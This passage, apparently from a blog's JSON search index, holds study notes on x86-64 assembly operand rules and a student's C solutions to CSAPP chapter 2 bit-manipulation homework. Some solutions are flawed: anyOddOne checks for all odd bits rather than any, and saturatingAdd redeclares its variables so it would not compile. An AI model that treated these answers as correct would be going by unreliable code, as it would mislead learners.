按照书上的描述，好像还可以XMM， XMM\n- vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。\n- vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）\n- vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）\n- vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）\n- vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）\n- vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM\n- vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样\n\n#### MISC\n\n- intel format have reverse order operands;\n- Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value \n- Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.\n- Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0\n- 后缀的匹配\n","content":"<h4 id=\"MOV\"><a href=\"#MOV\" class=\"headerlink\" title=\"MOV\"></a>MOV</h4><ul>\n<li>操作数不能都是memory</li>\n<li>register must match the suffix</li>\n<li>movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展</li>\n<li>movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register</li>\n<li>movz、movs系列have a register or memory location as the source and a register as the destination.</li>\n<li>cltq: SignExtend(%eax) -&gt; %rax</li>\n<li>movzlq不存在，可以用movl实现。<strong>但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在</strong></li>\n</ul>\n<h4 id=\"其他指令\"><a href=\"#其他指令\" class=\"headerlink\" title=\"其他指令\"></a>其他指令</h4><ul>\n<li>leaq:<ul>\n<li>has no other size variants</li>\n<li>The destination operand must be a register.</li>\n</ul>\n</li>\n<li>Unary Operations:<ul>\n<li>operand can be either a register or a memory location. </li>\n</ul>\n</li>\n<li>Binary Operations:<ul>\n<li>the second operand is used as both a source and a destination</li>\n<li>the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.</li>\n<li>the two operands can’t both be memory location</li>\n<li>when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.</li>\n</ul>\n</li>\n<li>Shift Operations<ul>\n<li>shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift</li>\n<li>shift amount can be imm value or %cl</li>\n<li>a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63</li>\n<li>destination can be register or memory location</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"浮点指令\"><a href=\"#浮点指令\" class=\"headerlink\" title=\"浮点指令\"></a>浮点指令</h2><ul>\n<li>vmovss, vmovd的操作数可以是（第一个source，第二个destination）<ul>\n<li>memory， XMM</li>\n<li>XMM， memory</li>\n<li>按照书上的描述，好像还可以XMM， XMM</li>\n</ul>\n</li>\n<li>vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。</li>\n<li>vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）</li>\n<li>vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）</li>\n<li>vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）</li>\n<li>vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）</li>\n<li>vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM</li>\n<li>vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样</li>\n</ul>\n<h4 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h4><ul>\n<li>intel format have reverse order operands;</li>\n<li>Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value </li>\n<li>Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.</li>\n<li>Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0</li>\n<li>后缀的匹配</li>\n</ul>\n","slug":"汇编相关","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"汇编","slug":"汇编","permalink":"https://h-zex.github.io/tags/汇编/"}]},{"title":"CSAPP3e 第二章作业","date":"2017-08-06T04:18:27.000Z","path":"2017/08/06/CSAPP3e-第二章作业/","text":"2.5812345int isLittleEndian1()&#123; int a = 1; return ((char*)&amp;a)[0];&#125; 2.591234int f2_59(int x, int y)&#123; return x&amp;(((1&lt;&lt;(sizeof(int)-1)*8)-1)&lt;&lt;8)|(y&amp;0xFF);&#125; 2.6012345unsigned replaceByte(unsigned x, int i, unsigned char b)&#123; int t = ~0 - ((1LL&lt;&lt;(i+1&lt;&lt;3))-(1&lt;&lt;(i&lt;&lt;3))); return x&amp;t|((unsigned)b&lt;&lt;(i&lt;&lt;3));&#125; 2.611234int A2_61(int x)&#123; return !(x^~0);&#125; 1234int B2_61(int x)&#123; return !x;&#125; 1234int C2_61(int x)&#123; return !((x&amp;0xFF)^0xFF);&#125; 1234int D2_61(int x)&#123; return !((unsigned)x&gt;&gt;((sizeof(int)-1)&lt;&lt;3));&#125; 2.6212345int isRightShiftAreArithmetic()&#123; int x = -1&gt;&gt;1; return x==-1;&#125; 2.6312345unsigned srl(unsigned x, int k)&#123; unsigned xsra = (int)x&gt;&gt;k; return xsra&amp;(1&lt;&lt;(sizeof(int)&lt;&lt;3)-k)-1;&#125; 123456int sra(int x, int k)&#123; int xsrl = (unsigned)x&gt;&gt;k; int t = ~0-(1&lt;&lt;k)+1 &amp; x&gt;&gt;((sizeof(int)&lt;&lt;3)-1); return t|xsrl;&#125; 2.6412345//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始int anyOddOne(unsigned x)&#123; return (x&amp;0xaaaaaaaa)==0xaaaaaaaa;&#125; 2.6512345678910int oddOnesV1(unsigned x)&#123; //思路，用xor消掉成对的1，不成对的记录下来 x ^= x&lt;&lt;16; x ^= x&lt;&lt;8; x ^= x&lt;&lt;4; x ^= x&lt;&lt;2; x ^= x&lt;&lt;1; return x&gt;&gt;31;&#125; 12345678910int oddOnesV2(unsigned x)&#123; //思路与上一个函数类似 x ^= x&lt;&lt;1; //思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位） x ^= x&lt;&lt;2; //只考虑mod4==0的位置 x ^= x&lt;&lt;4; //只考虑mod8==0的位置 x ^= x&lt;&lt;8; //只考虑mod16==0的位置 x ^= x&lt;&lt;16; //只考虑mod32==0的位置 return x&gt;&gt;31;&#125; 2.66123456789int leftMostOne(unsigned x)&#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return x-(x&gt;&gt;1);&#125; 2.671234int intSizeIs32()&#123; return INT_MAX==0x80000000-1;&#125; 2.68123456int lowerOneMark(int n)&#123; int t = -!(n-(sizeof(int)&lt;&lt;3)); //方法1 return (1&lt;&lt;n)-1&amp;~t | t;// return ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1; //方法2&#125; 2.6912345unsigned rotateLeft(unsigned x, int n)&#123; //移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞 return x&gt;&gt;((sizeof(unsigned)&lt;&lt;3)-n-1)&gt;&gt;1 | x&lt;&lt;n;&#125; 2.701234int fitBits(int x, int n)&#123; return x&gt;&gt;n-1==0 | x&gt;&gt;n-1==-1;&#125; 2.7112345typedef unsigned pack_t;int xbyte(pack_t word, int bytenum)&#123; return (int)word&lt;&lt;(3-bytenum&lt;&lt;3)&gt;&gt;24;&#125; 2.73123456789101112131415161718192021222324252627int saturatingAdd(int x, int y)&#123; //方法一 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t)+((unsigned)x+y&gt;&gt;t); t = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t); return -(p==2&amp;&amp;t!=1)&amp;INT_MIN | -(p==1&amp;&amp;t!=1)&amp;INT_MAX | -(p==0||t==1)&amp;x+y | -(p==3||t==1)&amp;x+y; //方法二 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t&lt;&lt;2)|((unsigned)y&gt;&gt;t&lt;&lt;1)|((unsigned)x+y&gt;&gt;t); return -(p==6)&amp;INT_MIN | -(p==1)&amp;INT_MAX | -(p!=1&amp;&amp;p!=6)&amp;x+y; //方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904） int w=sizeof(int)&lt;&lt;3; int sum = x+y; int mask = 1&lt;&lt;(w-1); int x_lmb = x&amp;mask; int y_lmb = y&amp;mask; int sum_lmb = sum&amp;mask; int neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb); int pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb; (pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); //这一条不错 return sum;&#125; 2.741234567int tsubOk(int x, int y)&#123; int t = (sizeof(int)&lt;&lt;3)-1; int p = (unsigned)x&gt;&gt;t&lt;&lt;2 | (unsigned)-y&gt;&gt;t&lt;&lt;1 | (unsigned)x-y&gt;&gt;t; t = y==INT_MIN; return p!=6 &amp;&amp; p!=1 &amp;&amp; !t || t &amp;&amp; p==6;&#125; 2.75123456unsigned unsignedHightProd(unsigned x, unsigned y)&#123; unsigned t = signed_high_prod(x, y); int l = (sizeof(int)&lt;&lt;3)-1; return t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;&#125; 2.761234567891011void* Calloc(size_t nmemb, size_t size)&#123; size_t t = nmemb*size; void *p; if(!size || t/size==nmemb)&#123; p = malloc(t); if(!p)return NULL; memset(p, 0, t); &#125;else return NULL; return p;&#125; 2.7712345678int f2_77(int x)&#123; int k1 = (x&lt;&lt;4)+x; int k2 = -(x&lt;&lt;3)+x; int k3 = (x&lt;&lt;6)-(x&lt;&lt;2); int k4 = -(x&lt;&lt;7)+(x&lt;&lt;4); return (k1==x*17)&lt;&lt;3 | (k2==x*-7)&lt;&lt;2 | (k3==x*60)&lt;&lt;1 | k4==x*-112;&#125; 2.78123456int dividePower2(int x, int k)&#123; int l = sizeof(int)&lt;&lt;3; l = -(x&gt;&gt;l-1); return (l&lt;&lt;k)-l+x &gt;&gt; k;&#125; 2.791234567int mul3div4(int x)&#123; x = (x&lt;&lt;2) - x; int l = sizeof(int)&lt;&lt;3; int t = -(x&gt;&gt;l-1); return (t&lt;&lt;2)-t+x &gt;&gt; 2;&#125; 2.8012345678910int threefourths(int x)&#123; int t = x&amp;0x3; int t2 = -(x&gt;&gt;(sizeof(int)&lt;&lt;3)-1); int p = (x&gt;&gt;2); p = (p&lt;&lt;1)+p; t = (t&lt;&lt;1)+t; p += (t&gt;&gt;2) + (t2&amp;&amp;t); return p;&#125; 2.8112345678910int hw281A(int k)&#123; return 0-(1&lt;&lt;k-!!k&lt;&lt;!!k); //k may equal to 0 or 32;&#125;int hw281B(int j, int k)&#123; int t = k+j; return (0-(1&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (0-(1&lt;&lt;t-!!t&lt;&lt;!!t));&#125; 2.8212345678/* * A: NO; x== 0x10000000, B==rand(); * B: Yes; * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。 * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加 * D: Yes; * E: Yes; */ 2.83$\\sum_{i=1}^{\\infty}Y2^{-ki}$ 2.841return ((sx&lt;sy) &amp;&amp; ux!=0 &amp;&amp; uy!=0x80000000) | (sx==sy) &amp; !!(ux-uy);","raw":"---\ntitle: CSAPP3e 第二章作业\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-08-06 12:18:27\ntags:\n- CSAPP Homework\ndescription: My solution to Ch2's Hw\ncategories:\n- CSAPP\n---\n\n## 2.58\n```c\nint isLittleEndian1()\n{\n\tint a = 1;\n\treturn ((char*)&a)[0];\n}\n```\n\n\n## 2.59\n```c\nint f2_59(int x, int y)\n{\n\treturn x&(((1<<(sizeof(int)-1)*8)-1)<<8)|(y&0xFF);\n}\n```\n\n\n## 2.60\n```c\nunsigned replaceByte(unsigned x, int i, unsigned char b)\n{\n\tint t = ~0 - ((1LL<<(i+1<<3))-(1<<(i<<3)));\n\treturn x&t|((unsigned)b<<(i<<3));\n}\n```\n\n\n## 2.61\n```c\nint A2_61(int x)\n{\n\treturn !(x^~0);\n}\n```\n\n```c\nint B2_61(int x)\n{\n\treturn !x;\n}\n```\n\n```c\nint C2_61(int x)\n{\n\treturn !((x&0xFF)^0xFF);\n}\n```\n\n```c\nint D2_61(int x)\n{\n\treturn !((unsigned)x>>((sizeof(int)-1)<<3));\n}\n```\n\n\n## 2.62\n```c\nint isRightShiftAreArithmetic()\n{\n\tint x = -1>>1;\n\treturn x==-1;\n}\n```\n\n\n## 2.63\n```c\nunsigned srl(unsigned x, int k)\n{\n\tunsigned xsra = (int)x>>k;\n\treturn xsra&(1<<(sizeof(int)<<3)-k)-1;\n}\n```\n\n```c\nint sra(int x, int k)\n{\n\tint xsrl = (unsigned)x>>k;\n\tint t = ~0-(1<<k)+1 & x>>((sizeof(int)<<3)-1);\n\treturn t|xsrl;\n}\n```\n\n\n## 2.64\n```c\n//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始\nint anyOddOne(unsigned x)\n{\n\treturn (x&0xaaaaaaaa)==0xaaaaaaaa;\n}\n```\n\n\n## 2.65\n```c\nint oddOnesV1(unsigned x)\n{\n\t//思路，用xor消掉成对的1，不成对的记录下来\n\tx ^= x<<16;\n\tx ^= x<<8;\n\tx ^= x<<4;\n\tx ^= x<<2;\n\tx ^= x<<1;\n\treturn x>>31;\n}\n```\n\n```c\nint oddOnesV2(unsigned x)\n{\n\t//思路与上一个函数类似\n\tx ^= x<<1;\t//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）\n\tx ^= x<<2;\t//只考虑mod4==0的位置\n\tx ^= x<<4;\t//只考虑mod8==0的位置\n\tx ^= x<<8;\t//只考虑mod16==0的位置\n\tx ^= x<<16;\t//只考虑mod32==0的位置\n\treturn x>>31;\n}\n```\n\n\n## 2.66\n```c\nint leftMostOne(unsigned x)\n{\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn x-(x>>1);\n}\n```\n\n\n## 2.67\n```c\nint intSizeIs32()\n{\n\treturn INT_MAX==0x80000000-1;\n}\n```\n\n\n## 2.68\n```c\nint lowerOneMark(int n)\n{\n\tint t = -!(n-(sizeof(int)<<3));\t//方法1\n\treturn (1<<n)-1&~t | t;\n//\treturn ((n!=(sizeof(int)<<3))<<n)-1;\t//方法2\n}\n```\n\n\n## 2.69\n```c\nunsigned rotateLeft(unsigned x, int n)\n{\n\t//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞\n\treturn x>>((sizeof(unsigned)<<3)-n-1)>>1 | x<<n;\n}\n```\n\n\n## 2.70\n```c\nint fitBits(int x, int n)\n{\n\treturn x>>n-1==0 | x>>n-1==-1;\n}\n```\n\n\n## 2.71\n```c\ntypedef unsigned pack_t;\nint xbyte(pack_t word, int bytenum)\n{\n\treturn (int)word<<(3-bytenum<<3)>>24;\n}\n```\n\n## 2.73\n```c\nint saturatingAdd(int x, int y)\n{\n\t//方法一\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t)+((unsigned)y>>t)+((unsigned)x+y>>t);\n\tt = ((unsigned)x>>t)+((unsigned)y>>t);\n\treturn -(p==2&&t!=1)&INT_MIN | -(p==1&&t!=1)&INT_MAX | -(p==0||t==1)&x+y | -(p==3||t==1)&x+y;\n  \n\t//方法二\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t<<2)|((unsigned)y>>t<<1)|((unsigned)x+y>>t);\n\treturn -(p==6)&INT_MIN | -(p==1)&INT_MAX | -(p!=1&&p!=6)&x+y;\n  \n\t//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）\n\tint w=sizeof(int)<<3;\n\tint sum = x+y;\n\tint mask = 1<<(w-1);\n\tint x_lmb = x&mask;\n\tint y_lmb = y&mask;\n\tint sum_lmb = sum&mask;\n\t\n\tint neg_of = x_lmb && y_lmb && (!sum_lmb);\n\tint pos_of = !x_lmb && !y_lmb && sum_lmb;\n\t\n\t(pos_of &&(sum=INT_MAX)) || (neg_of && (sum = INT_MIN)); //这一条不错\n\treturn sum;\n}\n```\n\n\n## 2.74\n```c\nint tsubOk(int x, int y)\n{\n\tint t = (sizeof(int)<<3)-1;\n\tint p = (unsigned)x>>t<<2 | (unsigned)-y>>t<<1 | (unsigned)x-y>>t;\n\tt = y==INT_MIN;\n\treturn p!=6 && p!=1 && !t || t && p==6;\n}\n```\n\n\n## 2.75\n```c\nunsigned unsignedHightProd(unsigned x, unsigned y)\n{\n\tunsigned t = signed_high_prod(x, y);\n\tint l = (sizeof(int)<<3)-1;\n\treturn t + (x>>l)*x+(y>>l)*y;\n}\n```\n\n\n## 2.76\n```c\nvoid* Calloc(size_t nmemb, size_t size)\n{\n\tsize_t t = nmemb*size;\n\tvoid *p;\n\tif(!size || t/size==nmemb){\n\t\tp = malloc(t);\n\t\tif(!p)return NULL;\n\t\tmemset(p, 0, t);\n\t}else return NULL;\n\treturn p;\n}\n```\n\n\n## 2.77\n```c\nint f2_77(int x)\n{\n\tint k1 = (x<<4)+x;\n\tint k2 = -(x<<3)+x;\n\tint k3 = (x<<6)-(x<<2);\n\tint k4 = -(x<<7)+(x<<4);\n\treturn (k1==x*17)<<3 | (k2==x*-7)<<2 | (k3==x*60)<<1 | k4==x*-112;\n}\n```\n\n## 2.78\n```c\nint dividePower2(int x, int k)\n{\n\tint l = sizeof(int)<<3;\n\tl = -(x>>l-1);\n\treturn (l<<k)-l+x >> k;\n}\n```\n## 2.79\n```c\nint mul3div4(int x)\n{\n\tx = (x<<2) - x;\n\tint l = sizeof(int)<<3;\n\tint t = -(x>>l-1);\n\treturn (t<<2)-t+x >> 2;\n}\n```\n## 2.80\n```c\nint threefourths(int x)\n{\n\tint t = x&0x3;\n\tint t2 = -(x>>(sizeof(int)<<3)-1);\n\tint p = (x>>2);\n\tp = (p<<1)+p;\n\tt = (t<<1)+t;\n\tp += (t>>2) + (t2&&t);\n\treturn p;\n}\n```\n## 2.81\n```c\nint hw281A(int k)\n{\n\treturn 0-(1<<k-!!k<<!!k);\t//k may equal to 0 or 32;\n}\n\nint hw281B(int j, int k)\n{\n\tint t = k+j;\n\treturn (0-(1<<j-!!j<<!!j)) ^ (0-(1<<t-!!t<<!!t));\n}\n```\n## 2.82\n```c\n/*\n * A: NO; x== 0x10000000, B==rand();\n * B: Yes; \n * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。\n * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加\n * D: Yes;\n * E: Yes;\n */\n```\n\n## 2.83\n$\\sum_{i=1}^{\\infty}Y*2^{-k*i}$\n\n## 2.84\n```c\nreturn ((sx<sy) && ux!=0 && uy!=0x80000000) | (sx==sy) & !!(ux-uy);\n```\n","content":"<h2 id=\"2-58\"><a href=\"#2-58\" class=\"headerlink\" title=\"2.58\"></a>2.58</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLittleEndian1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ((<span class=\"keyword\">char</span>*)&amp;a)[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-59\"><a href=\"#2-59\" class=\"headerlink\" title=\"2.59\"></a>2.59</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_59</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;(((<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)*<span class=\"number\">8</span>)<span class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">8</span>)|(y&amp;<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-60\"><a href=\"#2-60\" class=\"headerlink\" title=\"2.60\"></a>2.60</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">replaceByte</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> i, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span> - ((<span class=\"number\">1L</span>L&lt;&lt;(i+<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">3</span>))-(<span class=\"number\">1</span>&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>)));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;t|((<span class=\"keyword\">unsigned</span>)b&lt;&lt;(i&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-61\"><a href=\"#2-61\" class=\"headerlink\" title=\"2.61\"></a>2.61</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">A2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !(x^~<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">B2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">C2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((x&amp;<span class=\"number\">0xFF</span>)^<span class=\"number\">0xFF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">D2_61</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> !((<span class=\"keyword\">unsigned</span>)x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)&lt;&lt;<span class=\"number\">3</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-62\"><a href=\"#2-62\" class=\"headerlink\" title=\"2.62\"></a>2.62</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isRightShiftAreArithmetic</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> x = <span class=\"number\">-1</span>&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x==<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-63\"><a href=\"#2-63\" class=\"headerlink\" title=\"2.63\"></a>2.63</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"title\">srl</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> xsra = (<span class=\"keyword\">int</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> xsra&amp;(<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)-k)<span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sra</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> xsrl = (<span class=\"keyword\">unsigned</span>)x&gt;&gt;k;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = ~<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k)+<span class=\"number\">1</span> &amp; x&gt;&gt;((<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> t|xsrl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-64\"><a href=\"#2-64\" class=\"headerlink\" title=\"2.64\"></a>2.64</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">anyOddOne</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&amp;<span class=\"number\">0xaaaaaaaa</span>)==<span class=\"number\">0xaaaaaaaa</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-65\"><a href=\"#2-65\" class=\"headerlink\" title=\"2.65\"></a>2.65</h2><figure 